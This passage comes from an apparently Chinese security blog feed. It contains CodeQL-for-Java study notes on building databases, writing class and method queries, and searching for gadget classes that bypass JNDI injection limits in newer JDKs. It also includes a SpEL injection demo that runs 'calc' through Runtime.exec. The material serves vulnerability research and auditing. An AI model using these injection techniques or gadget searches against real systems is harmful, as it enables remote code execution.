namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MainApp</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> spel <span class="token operator">=</span> <span class="token string">"T(java.lang.Runtime).getRuntime().exec(\"calc\")"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Expression</span> expression <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>spel<span class="token punctuation">)</span><span class="token punctuation">;</span>        expression<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>return new SpelExpression(expressionString, ast, this.configuration);</code>相当于我们构造到<code>Expression expression = parser.parseExpression(spel);</code>，但是最关键的<code>getValue</code>并没有办法触发。</p><h2 id="0x06-openjdk-java原生利用点"><a href="#0x06-openjdk-java原生利用点" class="headerlink" title="0x06 openjdk java原生利用点"></a>0x06 openjdk java原生利用点</h2><p>FBI warning（去tttang看吧）</p><h2 id="0x07后记"><a href="#0x07后记" class="headerlink" title="0x07后记"></a>0x07后记</h2><p>起初只是想用codeql玩一下，看能不能找到浅蓝师傅已经公布的利用方式，但是越走越深，最后甚至big胆到去扫openjdk，但找到了一种利用方式也算没白忙活吧。</p><p>codeql短短二十行代码就能将有用的类或方法筛选出来，确实是非常好用的工具。但是对于企业业务来说，给项目构建codeql数据库本身就是一件很难实现的事情，但是在其实现之前我们仍可以用codeql减少很多代码审计工作量。</p><p>(浅蓝yyds)</p><p>reference：</p><p><a href="https://tttang.com/archive/1405">https://tttang.com/archive/1405</a></p><p><a href="https://xz.aliyun.com/t/10829">https://xz.aliyun.com/t/10829</a></p><p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p><p><a href="https://github.com/lc/230-OOB">https://github.com/lc/230-OOB</a></p><p><a href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></p><h2 id="2024-11月补"><a href="#2024-11月补" class="headerlink" title="2024.11月补"></a>2024.11月补</h2><p>去年十月份的时候openjdk已经修复完成这个安全缺陷并且在官网对我个人以及SU战队进行了致谢🙏🙏🙏🙏</p><p><img src="https://s2.loli.net/2024/11/18/PdVFe1XmGvYUcx4.jpg" alt="mmexport1731665358882"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 学习记录 </tag>
            
            <tag> java web </tag>
            
            <tag> codeql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>codeql_for_java</title>
      <link href="/2022/07/11/codeql-for-java/"/>
      <url>/2022/07/11/codeql-for-java/</url>
      
        <content type="html"><![CDATA[<h1 id="codeql-for-java学习笔记"><a href="#codeql-for-java学习笔记" class="headerlink" title="codeql for java学习笔记"></a>codeql for java学习笔记</h1><h2 id="杂项-amp-amp-问题解决"><a href="#杂项-amp-amp-问题解决" class="headerlink" title="杂项&amp;&amp;问题解决"></a>杂项&amp;&amp;问题解决</h2><h3 id="开导"><a href="#开导" class="headerlink" title="开导"></a>开导</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">codeql database create codeql/micro-service-seclab-database <span class="token operator">--</span>language=java  <span class="token operator">--</span>command=<span class="token string">"mvn clean install --file pom.xml"</span> <span class="token operator">--</span>source-root=C:\Users\xxxxx\workspeace\micro_service_seclab-master<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CodeQL三大核心模块："><a href="#CodeQL三大核心模块：" class="headerlink" title="CodeQL三大核心模块："></a>CodeQL三大核心模块：</h3><ul><li><strong>DataFlow模块</strong>：主要常用的就是taintedTracking和hasflow,flowto</li><li><strong>Smtm模块</strong>：常用于ast分析，就是ifStmt,TryStmt之类的代码分支</li><li><strong>Expr模块</strong>：最常用，例如MethodAccess,Method,call,callable,ClassInstanceExpr之类的一大堆类也是常用的，在定义sink 、source之类的必须要用到</li></ul><h2 id="CodeQL-数据库创建原理分析"><a href="#CodeQL-数据库创建原理分析" class="headerlink" title="CodeQL 数据库创建原理分析"></a>CodeQL 数据库创建原理分析</h2><p>原文地址：<a href="https://paper.seebug.org/1921/">https://paper.seebug.org/1921/</a></p><p><img src="https://s2.loli.net/2022/07/11/UE4newzpOa5BXjd.png" alt="img"></p><p>在<code>javac</code>编译目标代码时，通过<code>Extractor</code>与其进行交互。<code>Extractor</code>会根据每一个<code>java</code>文件的内容生成一个<code>trap</code>文件，后续再根据<code>trap</code>文件生成实际的数据库。同时它会将处理的每一个<code>java</code>文件拷贝一份保存在数据中，便于后续展示查询结果时能看到代码的上下文。</p><p>Linux下codeql启动脚本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token builtin class-name">set</span> -e<span class="token function-name function">error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$@</span>"</span> <span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span><span class="token file-descriptor important">&amp;2</span>    <span class="token builtin class-name">exit</span> <span class="token number">3</span> <span class="token comment"># SubcommandCommon.EXITCODE_LAUNCHERFAILURE</span><span class="token punctuation">}</span><span class="token assign-left variable">pwdExtraArg</span><span class="token operator">=</span><span class="token keyword">if</span> <span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable">$CODEQL_PLATFORM</span>"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">case</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> -s<span class="token variable">)</span></span>"</span> <span class="token keyword">in</span>        *Linux*<span class="token punctuation">)</span>            <span class="token assign-left variable">CODEQL_PLATFORM</span><span class="token operator">=</span>linux64            <span class="token punctuation">;</span><span class="token punctuation">;</span>        *Darwin*<span class="token punctuation">)</span>            <span class="token assign-left variable">CODEQL_PLATFORM</span><span class="token operator">=</span>osx64            <span class="token punctuation">;</span><span class="token punctuation">;</span>        *MINGW* <span class="token operator">|</span> MSYS*<span class="token punctuation">)</span>            <span class="token assign-left variable">CODEQL_PLATFORM</span><span class="token operator">=</span>win64            <span class="token assign-left variable">pwdExtraArg</span><span class="token operator">=</span>-W            <span class="token punctuation">;</span><span class="token punctuation">;</span>        *<span class="token punctuation">)</span>            error <span class="token string">"Unknown operating system '<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> -s<span class="token variable">)</span></span>' (full uname: <span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> -a<span class="token variable">)</span></span>."</span>    <span class="token keyword">esac</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> -z <span class="token string">"<span class="token variable">$CODEQL_DIST</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span>     <span class="token punctuation">[</span> -f <span class="token string">"<span class="token variable">$CODEQL_DIST</span>/codeql"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span>     <span class="token punctuation">[</span> -f <span class="token string">"<span class="token variable">$CODEQL_DIST</span>/tools/codeql.jar"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">:</span> <span class="token comment"># This existing value looks trustworthy, probably computed by an enclosing</span>      <span class="token comment"># instance of ourselves -- so don't bother with (expensive?) searching from $0.</span><span class="token keyword">else</span>    <span class="token comment"># Follow links from $0 until we find one that looks right.</span>    <span class="token comment"># (This way, users' own symlinks from their path into a dist will work,</span>    <span class="token comment"># but a symlink farm replicating the dist will also work).</span>    <span class="token assign-left variable">launcher</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$0</span>"</span>    <span class="token assign-left variable">dirname</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">dirname</span> <span class="token string">"<span class="token variable">$launcher</span>"</span><span class="token variable">)</span></span>"</span>    <span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token operator">!</span> -f <span class="token string">"<span class="token variable">$dirname</span>/tools/codeql.jar"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">do</span>        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> -L <span class="token string">"<span class="token variable">$launcher</span>"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>            error <span class="token string">"It does not look like <span class="token variable">$launcher</span> is located in a CodeQL distribution directory."</span>        <span class="token keyword">fi</span>        <span class="token assign-left variable">target</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span>readlink <span class="token string">"<span class="token variable">$launcher</span>"</span><span class="token variable">)</span></span>"</span>        <span class="token keyword">case</span> <span class="token string">"<span class="token variable">$target</span>"</span> <span class="token keyword">in</span>            /*<span class="token punctuation">)</span> <span class="token assign-left variable">launcher</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$target</span>"</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>            *<span class="token punctuation">)</span>  <span class="token assign-left variable">launcher</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$dirname</span>/<span class="token variable">$target</span>"</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>        <span class="token keyword">esac</span>        <span class="token assign-left variable">dirname</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">dirname</span> <span class="token string">"<span class="token variable">$launcher</span>"</span><span class="token variable">)</span></span>"</span><span class="token punctuation">;</span>    <span class="token keyword">done</span>    <span class="token assign-left variable">CODEQL_DIST</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">cd</span> <span class="token string">"<span class="token variable">$dirname</span>"</span> <span class="token punctuation">;</span> <span class="token builtin class-name">pwd</span> $pwdExtraArg<span class="token variable">)</span></span>"</span><span class="token keyword">fi</span><span class="token comment"># Check if we're writing to a terminal</span><span class="token keyword">if</span> <span class="token punctuation">[</span> -t <span class="token number">2</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span> <span class="token builtin class-name">export</span> <span class="token assign-left variable">CODEQL_ISATTY</span><span class="token operator">=</span>stderr <span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token builtin class-name">unset</span> CODEQL_ISATTY <span class="token punctuation">;</span> <span class="token keyword">fi</span><span class="token builtin class-name">export</span> CODEQL_DIST<span class="token builtin class-name">export</span> CODEQL_PLATFORM<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$CODEQL_PLATFORM</span>"</span> <span class="token operator">=</span> <span class="token string">"osx64"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token comment"># On macOS we need to run outside the Downloads directory, and ensure that</span>  <span class="token comment"># we have cleared all tools from quarantine.</span>  <span class="token assign-left variable">downloads</span><span class="token operator">=</span><span class="token string">"<span class="token environment constant">$HOME</span>/Downloads"</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"x<span class="token variable">${CODEQL_DIST<span class="token operator">#</span>$downloads}</span>"</span> <span class="token operator">!=</span> <span class="token string">"x<span class="token variable">$CODEQL_DIST</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    error <span class="token string">"\Cannot run CodeQL from within Downloads directory, because of securityrestrictions placed on that directory.  Please move the CodeQL distributionto a location outside the Downloads directory tree.CodeQL distribution: <span class="token variable">${CODEQL_DIST}</span>Downloads directory: <span class="token variable">${downloads}</span>"</span>  <span class="token keyword">fi</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span> -w <span class="token string">"<span class="token variable">${CODEQL_DIST}</span>"</span> -a -w <span class="token string">"<span class="token variable">${CODEQL_DIST}</span>/codeql"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> -f /usr/bin/xattr <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token comment"># If /usr/bin/xattr exists, we know that's the default version of xattr</span>      <span class="token comment"># that Mac OS bundles rather than a GNU one. This is what we want, so</span>      <span class="token comment"># use that.</span>      <span class="token assign-left variable">XATTR_PATH</span><span class="token operator">=</span>/usr/bin/xattr    <span class="token keyword">else</span>      <span class="token comment"># There's nothing at /usr/bin/xattr. This is strange, but let's continue</span>      <span class="token comment"># anyway and use whatever we find on the PATH, hoping it's a Mac OS</span>      <span class="token comment"># version too. This ensures forward compatibility with a future Mac OS</span>      <span class="token comment"># that moves where xattr is located.</span>      <span class="token assign-left variable">XATTR_PATH</span><span class="token operator">=</span>xattr    <span class="token keyword">fi</span>    <span class="token comment"># Similarly, use /usr/bin/find and /usr/bin/xargs, which also differ sufficiently</span>    <span class="token comment"># between the BSD and GNU implementations to break our usage here:</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> -f /usr/bin/find <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token assign-left variable">FIND_PATH</span><span class="token operator">=</span>/usr/bin/find    <span class="token keyword">else</span>      <span class="token assign-left variable">FIND_PATH</span><span class="token operator">=</span>find    <span class="token keyword">fi</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> -f /usr/bin/xargs <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token assign-left variable">XARGS_PATH</span><span class="token operator">=</span>/usr/bin/xargs    <span class="token keyword">else</span>      <span class="token assign-left variable">XARGS_PATH</span><span class="token operator">=</span>xargs    <span class="token keyword">fi</span>        <span class="token string">"<span class="token variable">$FIND_PATH</span>"</span> <span class="token string">"<span class="token variable">${CODEQL_DIST}</span>"</span> <span class="token string">"("</span> -path <span class="token string">"*/osx64/*"</span> -o -path <span class="token string">"*/macos/*"</span> <span class="token string">")"</span> -a <span class="token punctuation">\</span>      <span class="token string">"("</span> -perm -100 -o -perm -10 -o -perm -1 -o -name <span class="token string">"*.dll"</span> <span class="token string">")"</span> -a <span class="token punctuation">\</span>      <span class="token string">"!"</span> -type d -a -xattr -print0 <span class="token operator">|</span> <span class="token string">"<span class="token variable">$XARGS_PATH</span>"</span> -0 -- <span class="token string">"<span class="token variable">$XATTR_PATH</span>"</span> -c    <span class="token string">"<span class="token variable">$XATTR_PATH</span>"</span> -c <span class="token string">"<span class="token variable">${CODEQL_DIST}</span>/codeql"</span>    <span class="token function">chmod</span> a-w <span class="token string">"<span class="token variable">${CODEQL_DIST}</span>/codeql"</span>  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token assign-left variable">jvmArgs</span><span class="token operator">=</span><span class="token string">""</span><span class="token assign-left variable">takeNext</span><span class="token operator">=</span>false<span class="token keyword">for</span> <span class="token for-or-select variable">arg</span> <span class="token keyword">in</span> <span class="token string">"<span class="token variable">$@</span>"</span> <span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token keyword">if</span> <span class="token variable">$takeNext</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"x<span class="token variable">$arg</span>"</span> <span class="token operator">!=</span> <span class="token string">"x--"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token assign-left variable">jvmArgs</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$jvmArgs</span> <span class="token variable">$arg</span>"</span>        <span class="token assign-left variable">takeNext</span><span class="token operator">=</span>false    <span class="token keyword">else</span>        <span class="token keyword">case</span> <span class="token string">"<span class="token variable">$arg</span>"</span> <span class="token keyword">in</span>            -J<span class="token punctuation">)</span>   <span class="token assign-left variable">takeNext</span><span class="token operator">=</span>true <span class="token punctuation">;</span><span class="token punctuation">;</span>            -J<span class="token operator">=</span>*<span class="token punctuation">)</span> <span class="token assign-left variable">jvmArgs</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$jvmArgs</span> <span class="token variable">${arg<span class="token operator">#</span>-J=}</span>"</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>            -J*<span class="token punctuation">)</span>  <span class="token assign-left variable">jvmArgs</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$jvmArgs</span> <span class="token variable">${arg<span class="token operator">#</span>-J}</span>"</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>            --<span class="token punctuation">)</span>   <span class="token builtin class-name">break</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>        <span class="token keyword">esac</span>    <span class="token keyword">fi</span><span class="token keyword">done</span><span class="token assign-left variable">arch</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> -m<span class="token variable">)</span></span>"</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$CODEQL_PLATFORM</span>"</span> <span class="token operator">=</span> <span class="token string">"osx64"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$arch</span>"</span> <span class="token operator">=</span> <span class="token string">"arm64"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">:</span> <span class="token variable">${CODEQL_JAVA_HOME<span class="token operator">:=</span>$CODEQL_DIST<span class="token operator">/</span>tools<span class="token operator">/</span>$CODEQL_PLATFORM<span class="token operator">/</span>java-aarch64}</span><span class="token keyword">else</span>    <span class="token builtin class-name">:</span> <span class="token variable">${CODEQL_JAVA_HOME<span class="token operator">:=</span>$CODEQL_DIST<span class="token operator">/</span>tools<span class="token operator">/</span>$CODEQL_PLATFORM<span class="token operator">/</span>java}</span><span class="token keyword">fi</span><span class="token builtin class-name">exec</span> <span class="token string">"<span class="token variable">${CODEQL_JAVA_HOME}</span>/bin/java"</span> <span class="token punctuation">\</span>    <span class="token variable">$jvmArgs</span> <span class="token punctuation">\</span>    --add-modules jdk.unsupported <span class="token punctuation">\</span>    -cp <span class="token string">"<span class="token variable">$CODEQL_DIST</span>/tools/codeql.jar"</span> <span class="token punctuation">\</span>    <span class="token string">"com.semmle.cli2.CodeQL"</span> <span class="token string">"<span class="token variable">$@</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置环境变量<code>CODEQL_PLATFORM</code>，<code>CODEQL_JAVA_HOME</code>和<code>CODEQL_DIST</code>后，执行<code>codeql.jar</code></p><p>在<code>codeql\codeql\java\tools</code>目录下：</p><p><img src="https://s2.loli.net/2022/07/11/GIfFmW1C4wNyLER.png" alt="image-20220627102955739"></p><p>可以看到一些<code>jar</code>包和脚本，以及配置文件<code>codeql-extractor.yml</code>。<code>codeql-java-agent.jar</code>为<code>agent</code>，在整个编译期开始前注入<code>jvm</code>中并用于执行<code>extractor</code>操作</p><p>整个<code>Extractor</code>的工作流程</p><ul><li>根据<code>javac</code>配置文件创建<code>javac compiler</code>对象</li><li><code>javac</code>对源码一次进行预处理</li><li>根据前一步出的处理结果，构造<code>trap</code>文件</li></ul><p>据的构建过程中，<code>codeql</code>并不需要完整的去编译源代码，只是借助<code>javac</code>从源码中那拿点东西。其次，只要能够根据源码文件构造正确的<code>javac.args</code>，就可以生成<code>trap</code>文件了。之后再通过<code>codeql database finalize</code>即可得到一个数据库。</p><h2 id="如何对类进行限制"><a href="#如何对类进行限制" class="headerlink" title="如何对类进行限制"></a>如何对类进行限制</h2><p>项目数据库：<a href="https://github.com/githubsatelliteworkshops/codeql/releases/download/v1.0/apache_struts_cve_2017_9805.zip">https://github.com/githubsatelliteworkshops/codeql/releases/download/v1.0/apache_struts_cve_2017_9805.zip</a></p><p>内含源码和已经生成好的ql数据库，直接导入即可。</p><h3 id="RefType"><a href="#RefType" class="headerlink" title="RefType"></a>RefType</h3><p>相关使用文档：<a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Type.qll/type.Type$RefType.html">https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Type.qll/type.Type$RefType.html</a></p><blockquote><p>getACallable() 获取所有可以调用方法(其中包括构造方法)<br>getAMember() 获取所有成员，其中包括调用方法，字段和内部类这些<br>getAField() 获取所有字段<br>getAMethod() 获取所有方法<br>getASupertype() 获取父类<br>getAnAncestor() 获取所有的父类相当于递归的getASupertype*()</p></blockquote><p><code>RefType</code>包含了我们在Java里面使用到的<code>Class</code>,<code>Interface</code>的声明，比如我们现在需要查询一个类名为<code>XStreamHandler</code>的类，但是我们不确定他是<code>Class</code>还是<code>Interface</code>，我们就可以通过 <code>RefType</code>定义变量后进行查询</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> java<span class="token keyword">from</span> RefType c<span class="token keyword">where</span> c<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"XStreamHandler"</span><span class="token punctuation">)</span><span class="token keyword">select</span> c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Callable"><a href="#Callable" class="headerlink" title="Callable"></a>Callable</h3><p>在CodeQL中，Java的方法限制，我们可以使用<code>Callable</code>，<code>Callable</code>的父类是 <code>Method</code> 和 <code>Constructor</code></p><p><code>Callable</code>常使用的谓词：<br><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Member.qll/type.Member$Callable.html">https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Member.qll/type.Member$Callable.html</a></p><blockquote><p>polyCalls(Callable target) 一个Callable 是否调用了另外的Callable，这里面包含了类似虚函数的调用<br>hasName(name) 可以对方法名进行限制</p></blockquote><p>结合<code>RefType</code>寻找<code>XStreamHandler</code>类/接口中定义的<code>fromObject</code>方法：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> java<span class="token keyword">from</span> RefType c<span class="token punctuation">,</span> Callable cf<span class="token keyword">where</span>  c<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"XStreamHandler"</span><span class="token punctuation">)</span> <span class="token operator">and</span>  cf<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"fromObject"</span><span class="token punctuation">)</span> <span class="token operator">and</span>  cf <span class="token operator">=</span> c<span class="token punctuation">.</span>getACallable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">select</span> c<span class="token punctuation">,</span> cf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/07/11/5bCBHzhUAs9DvWS.png" alt="image-20220616140621842"></p><h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><p>之前的<code>Callable</code>是寻找类的定义/构造方法，对于方法的调用，我们可以用<code>call</code>来实现。<code>call</code>的父类包括<code>MethodAccess</code>, <code>ClassInstanceExpression</code>, <code>ThisConstructorInvocationStmt</code> 和 <code>SuperConstructorInvocationStmt</code></p><p><code>Call</code>中常使用的谓词：<br><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Expr.qll/type.Expr$Call.html">https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Expr.qll/type.Expr$Call.html</a></p><blockquote><p>getCallee() 返回函数声明的位置<br>getCaller() 返回调用这个函数的函数位置</p></blockquote><p>我们需要查询哪些地方调用了<code>XStream.fromXML</code>，可以这样构建ql语句：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> java<span class="token keyword">from</span> MethodAccess c<span class="token punctuation">,</span> Callable cb<span class="token keyword">where</span>  cb<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"fromXML"</span><span class="token punctuation">)</span> <span class="token operator">and</span>  cb<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"com.thoughtworks.xstream"</span><span class="token punctuation">,</span> <span class="token string">"XStream"</span><span class="token punctuation">)</span> <span class="token operator">and</span>  c<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> cb<span class="token keyword">select</span> c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/07/11/5pUDPJ96ctNGYqV.png" alt="image-20220616141100694"></p><h2 id="codeql-with-JNDI-RMI"><a href="#codeql-with-JNDI-RMI" class="headerlink" title="codeql with JNDI RMI"></a>codeql with JNDI RMI</h2><p>reference:<a href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a></p><p>本文下测试环境为jdk1.8.0_333</p><p>之前写过相关的文章，这里只聚焦于突破高版本对于JNDI注入的限制。我们整理一下能利用的类需要满足的条件：</p><ul><li>此类有public修饰的无参构造方法</li><li>此类有public修饰的包含sink方法，其参数只有一个String型</li></ul><p>根据两个条件我们来构造ql查询语句：</p><p>看起来不是很难。我们尝试构造一下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> javaclass UsableClass extends RefType {    UsableClass<span class="token punctuation">(</span><span class="token punctuation">)</span> {        this<span class="token punctuation">.</span>getAConstructor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasNoParameters<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token operator">and</span> this<span class="token punctuation">.</span>getAConstructor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isPublic<span class="token punctuation">(</span><span class="token punctuation">)</span>    }}class UsableMethod extends Method {    UsableMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> {        this<span class="token punctuation">.</span>getNumberOfParameters<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>        <span class="token operator">and</span> this<span class="token punctuation">.</span>getAParamType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"String"</span><span class="token punctuation">)</span>        <span class="token operator">and</span> this<span class="token punctuation">.</span>isPublic<span class="token punctuation">(</span><span class="token punctuation">)</span>    }}<span class="token keyword">from</span> UsableMethod me<span class="token punctuation">,</span> UsableClass cla<span class="token keyword">where</span>    me<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> cla<span class="token keyword">select</span> cla<span class="token punctuation">,</span>me<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找到的可利用点：</p><h3 id="groovy"><a href="#groovy" class="headerlink" title="groovy"></a>groovy</h3><h4 